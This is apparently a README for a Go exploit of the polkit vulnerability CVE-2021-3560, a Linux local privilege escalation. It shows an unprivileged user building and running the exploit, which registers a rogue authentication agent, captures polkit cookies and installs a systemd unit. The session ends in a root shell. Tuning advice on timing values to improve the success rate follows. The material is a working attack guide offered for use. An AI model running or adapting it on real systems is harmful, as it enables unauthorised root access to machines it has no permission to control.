PolicyKit CVE-2021-3560 Exploitation (Authentication Agent)
====

Blog posts about this exploitation: 
- https://ricterz.me/posts/2022-04-28-a-new-exploitation-way-for-cve-2021-3560-polkit-linux-privilege-escalation.txt
- http://noahblog.360.cn/a-new-exploitation-way-for-cve-2021-3560-policykit-linux-privilege-escalation

### Usage
```
nobody@test:/tmp/test$ go build exploit.go agent.go
nobody@test:/tmp/test$ ./exploit ./cve-2021-3560.service
[*] Registering PolicyKit authentication agent ...
[*] Authentication agent main loop running ...
[*] Starting systemd service 'cve-2021-3560.service' ...
[*] Enabling systemd unit file '/tmp/test/cve-2021-3560.service' ...
[*] Registering PolicyKit authentication agent ...
[*] Authentication agent main loop running ...
[+] Received authentication request
- Cookie: 58-348046779189d21a4f13e7f11a6bfb3d-1-217c4ffc597742a71186b51450b1bb53
- Action ID: org.freedesktop.systemd1.manage-units
[+] Received authentication request
- Cookie: 59-46429fdc0932831a0c894a89bf54cdca-1-d0eb41bf66c82daba96954b6163f1395
- Action ID: org.freedesktop.systemd1.manage-unit-files
Killed

nobody@test:/tmp/test$ /usr/local/bin/pwned -p
pwned-5.0# 
```

### Notice
For difference environments, change follow values may improve the successful rate:

- [agent.py#47](agent.go#L47): `time.Sleep(time.Millisecond * 10)`
- [agent.py#59](agent.go#L59): `time.Sleep(time.Millisecond * 1)`
